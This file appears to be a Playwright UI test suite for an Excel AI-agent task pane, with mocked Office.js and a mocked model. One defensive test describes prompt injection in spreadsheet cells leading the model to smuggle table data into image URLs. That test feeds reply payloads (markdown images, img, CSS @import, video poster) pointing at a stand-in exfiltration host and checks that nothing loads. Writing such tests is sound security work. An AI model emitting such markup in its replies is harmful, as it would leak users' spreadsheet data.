const fs = require('node:fs');
const path = require('node:path');
const assert = require('node:assert/strict');
const { chromium } = require(process.env.PLAYWRIGHT_MODULE || 'playwright');
const { sourceLoader } = require('./load-source.cjs');
const { DEFAULT_SETTINGS } = sourceLoader()('src/core/settings.ts');
const root = path.resolve(__dirname, '..');
const frame = data => `data: ${JSON.stringify(data)}\n\n`;
const completion = text => frame({ choices: [{ delta: { content: text } }] }) + frame({ choices: [{ delta: {}, finish_reason: 'stop' }] }) + 'data: [DONE]\n\n';
const deferred = () => { let resolve; const promise = new Promise(r => { resolve = r; }); return { promise, resolve }; };
const sleep = ms => new Promise(r => setTimeout(r, ms));

// 够用的 Excel：几张表、一个选区，选中后像真的 Excel 一样触发选区变化事件
const officeMock = `
window.__excel = { sheets: ['数据', '汇总', 'Q1 销售'], active: '数据', selection: 'A1:B3', log: [] };
window.Office = { onReady: fn => fn(), EventType: { DocumentSelectionChanged: 'selection' }, context: { document: {
  settings: { get: () => null, set: () => {}, remove: () => {}, saveAsync: () => {} },
  addHandlerAsync: (_event, fn) => { window.selectionChanged = fn; }, removeHandlerAsync: () => {} } } };
window.Excel = {
  SheetVisibility: { visible: 'Visible', hidden: 'Hidden', veryHidden: 'VeryHidden' },
  run: async fn => {
    const s = window.__excel;
    const cells = [['客户', '金额'], ['甲', 1], ['乙', 2]];
    const range = (sheet, address) => ({
      load() {}, address: sheet + '!' + address, rowCount: 3, columnCount: 2, values: cells, formulas: cells,
      getCell: () => range(sheet, address), getAbsoluteResizedRange: () => range(sheet, address),
      select() { s.active = sheet; s.selection = address; s.log.push(sheet + '!' + address); setTimeout(() => window.selectionChanged && window.selectionChanged()); },
    });
    const sheet = name => ({
      load() {}, name, isNullObject: !s.sheets.includes(name), visibility: 'Visible',
      activate() { s.active = name; s.log.push('activate ' + name); }, getRange: a => range(name, a),
    });
    return fn({ sync: async () => {}, workbook: {
      worksheets: { load() {}, get items() { return s.sheets.map(name => ({ name })); }, getActiveWorksheet: () => sheet(s.active), getItemOrNullObject: sheet },
      getSelectedRange: () => range(s.active, s.selection),
    } });
  },
};`;

(async () => {
  const browser = await chromium.launch({ channel: process.env.UI_BROWSER_CHANNEL || 'msedge', headless: true });
  try {
    const context = await browser.newContext({ viewport: { width: 300, height: 700 }, permissions: ['clipboard-read', 'clipboard-write'] });
    const page = await context.newPage();
    const errors = [];
    const script = [];
    const leaked = [];
    page.on('pageerror', error => errors.push(error.message));
    await page.addInitScript(settings => {
      if (!localStorage.getItem('excel-ai-agent-settings')) localStorage.setItem('excel-ai-agent-settings', JSON.stringify(settings));
    }, { ...DEFAULT_SETTINGS, baseUrl: 'http://localhost:11434/v1', model: 'ui-test', apiKey: '', useMemory: false, autoLearnSkills: false, autoCheckpoint: false, askDirection: false });
    await page.route('**/*', async route => {
      const url = new URL(route.request().url());
      if (url.hostname === 'localhost' && url.pathname === '/v1/chat/completions') {
        const step = script.shift();
        if (!step) throw new Error('Unexpected model request');
        const body = await step(route.request().postDataJSON());
        try { await route.fulfill({ contentType: 'text/event-stream', headers: { 'Access-Control-Allow-Origin': '*' }, body }); } catch { /* 已停止 */ }
        return;
      }
      if (url.hostname === 'exfil.test') leaked.push(url.href);
      if (url.origin !== 'https://excel-agent.test') return route.abort();
      if (url.pathname.endsWith('/office-js/office.js')) return route.fulfill({ contentType: 'application/javascript', body: officeMock });
      if (url.pathname.startsWith('/api/')) return route.fulfill({ status: 404, body: '{}' });
      const asset = path.resolve(root, 'dist', '.' + url.pathname);
      if (!asset.startsWith(path.join(root, 'dist') + path.sep) || !fs.existsSync(asset)) return route.abort();
      return route.fulfill({ body: fs.readFileSync(asset), contentType: asset.endsWith('.js') ? 'application/javascript' : asset.endsWith('.html') ? 'text/html' : 'application/octet-stream' });
    });
    await page.goto('https://excel-agent.test/taskpane.html');
    const input = page.getByRole('textbox', { name: '任务指令' });
    const chip = page.locator('.input-row .ctx-chip.sheet');

    // 1. 草稿：关掉窗格（重新加载）后还在
    await input.fill('按月汇总，先别发');
    await page.reload();
    assert.equal(await input.inputValue(), '按月汇总，先别发');
    console.log('PASS: unsent draft survives reloading the task pane');

    // 2. 点工作表胶囊：当前选区地址插到光标处，而不是接在末尾
    await chip.getByText('数据').waitFor();
    await input.fill('把 合并');
    await input.evaluate(el => { el.focus(); el.setSelectionRange(1, 1); });
    await chip.click();
    assert.equal(await input.inputValue(), '把 数据!A1:B3 合并');
    assert.equal(await input.evaluate(el => el.selectionStart), '把 数据!A1:B3'.length);
    await page.evaluate(() => { window.__excel.active = 'Q1 销售'; window.selectionChanged(); });
    await chip.getByText('Q1 销售').waitFor();
    await input.fill('');
    await chip.click();
    assert.equal(await input.inputValue(), "'Q1 销售'!A1:B3");
    console.log('PASS: sheet chip inserts the selection address at the caret, quoting names with spaces');

    // 3. 等得久了显示已用时间；回复里的地址可点击定位，代码块能一键复制
    const reply = deferred();
    script.push(async () => {
      await reply.promise;
      return completion('结果写在 汇总!A1:C4，公式：\n\n```\n=SUM(汇总!B2:B4)\n```\n\n原始数据见「Q1 销售」。');
    });
    await input.fill('汇总一下');
    await page.getByTitle('发送', { exact: true }).click();
    await page.locator('.thinking-bubble').waitFor();
    assert.equal(await page.locator('.thinking-elapsed').count(), 0, 'short waits stay quiet');
    await page.locator('.thinking-elapsed').getByText(/^\d+ 秒$/).waitFor({ timeout: 8000 });
    reply.resolve();
    await page.getByText('原始数据见', { exact: false }).waitFor();
    const links = page.locator('.assistant-bubble .range-link');
    assert.deepEqual(await links.allInnerTexts(), ['汇总!A1:C4', '「Q1 销售」']);
    assert.equal(await page.locator('.code-block pre .range-link').count(), 0, 'code stays copyable text');
    await links.first().click();
    assert.deepEqual(await page.evaluate(() => window.__excel.log.slice(-2)), ['activate 汇总', '汇总!A1:C4']);
    await chip.getByText('汇总').waitFor();
    await links.nth(1).click();
    assert.equal(await page.evaluate(() => window.__excel.active), 'Q1 销售');

    const copy = page.locator('.code-copy');
    await copy.click();
    await copy.getByText('已复制').waitFor();
    assert.equal(await page.evaluate(() => navigator.clipboard.readText()), '=SUM(汇总!B2:B4)');
    console.log('PASS: elapsed time on long waits, clickable result addresses, copyable code blocks');

    // 4. 表被删了：点旧链接给出原因；工作簿刷新后链接不再出现
    await page.evaluate(() => { window.__excel.sheets = ['数据', 'Q1 销售']; });
    await links.first().click();
    await page.locator('.composer-flash').getByText('找不到工作表「汇总」', { exact: false }).waitFor();
    await page.evaluate(() => window.selectionChanged());
    await page.waitForFunction(() => document.querySelectorAll('.assistant-bubble .range-link').length === 1);
    console.log('PASS: links to deleted sheets explain the failure and disappear after refresh');

    // 5. 发出去之后草稿清空，重新打开不会回来
    await page.reload();
    await page.getByText('原始数据见', { exact: false }).waitFor();
    assert.equal(await input.inputValue(), '');

    // 6. 回复里的远程资源：单元格里的注入文字能让模型把表格数据拼进图片地址，渲染时一个请求都不能发出去
    script.push(async () => completion([
      '已完成。', '',
      '![进度](https://exfil.test/a.png?d=1)', '',
      '<img src="https://exfil.test/b.png?d=2"><span style="background:url(https://exfil.test/c.png)" class="code-copy">样式</span>' +
        '<style>@import "https://exfil.test/d.css";</style><video poster="https://exfil.test/e.png"></video><input type="text">', '',
      '- [x] 已核对',
    ].join('\n')));
    await input.fill('继续');
    await page.getByTitle('发送', { exact: true }).click();
    const unsafe = page.locator('.assistant-bubble').last();
    await unsafe.getByText('已核对').waitFor();
    assert.equal(await unsafe.locator('img, style, video, [style], .code-copy, input:not([type=checkbox])').count(), 0);
    assert.match(await unsafe.getByRole('link', { name: '进度' }).getAttribute('href'), /^https:\/\/exfil\.test\/a\.png/);
    assert.equal(await unsafe.locator('input[type=checkbox][disabled]').count(), 1, 'task list checkbox stays, read-only');
    // 净化规则之外还有 CSP 兜底：页面里就算出现了远程图片也发不出请求
    await page.evaluate(() => new Promise(resolve => {
      const img = new Image();
      img.onload = img.onerror = resolve;
      img.src = 'https://exfil.test/f.png';
    }));
    await sleep(200);
    assert.deepEqual(leaked, []);
    console.log('PASS: remote images and styles in a reply never trigger a request');

    await sleep(200);
    assert.deepEqual(errors, []);
    console.log('PASS: all detail UI scenarios; model and Office mocked');
  } finally {
    await browser.close();
  }
})().catch(error => {
  console.error(error);
  process.exitCode = 1;
});
